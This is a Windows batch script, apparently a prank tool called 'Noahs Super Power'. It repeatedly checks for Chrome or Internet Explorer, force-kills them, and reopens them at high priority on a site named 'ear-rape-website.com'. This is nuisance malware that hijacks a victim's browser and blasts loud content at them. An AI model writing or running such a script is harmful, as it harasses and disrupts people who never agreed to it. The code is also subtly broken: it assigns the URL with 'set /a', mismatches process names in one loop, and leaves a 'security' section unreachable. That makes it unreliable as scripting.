@echo off
color e
title Noahs Super Power
set /a site="http://ear-rape-website.com"
set /a okay=0
ver >nul
cls

::chrome
:loop
if /i "%okay%" EQU "1" goto waitchrome
if /i "%okay%" EQU "2" goto waitie
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe">NUL
if "%ERRORLEVEL%"=="0" goto yeschrome
tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "iexplore.exe">NUL
if "%ERRORLEVEL%"=="0" goto yesie
goto loop

:yeschrome
taskkill /F /IM chrome.exe
start "Google Chrome" /HIGH chrome.exe "%site%"
cls
set /a okay=1
timeout /nobreak 4 >nul
goto loop
:yesie
taskkill /F /IM iexplore.exe /T
start "IExplore" /HIGH iexplore.exe "%site%"
cls
set /a okay=2
timeout /nobreak 4 >nul
goto loop

:waitchrome
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe">NUL
if not "%ERRORLEVEL%"=="0" goto waitchrome
timeout /t 0 >nul
goto loop

:waitie
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "iexplore.exe">NUL
if not "%ERRORLEVEL%"=="0" goto waitie
timeout /t 0 >nul
goto loop

::security stuff
:nexi
color c
echo Security Pass Invalid..
timeout /t 0 >nul
exit /B 1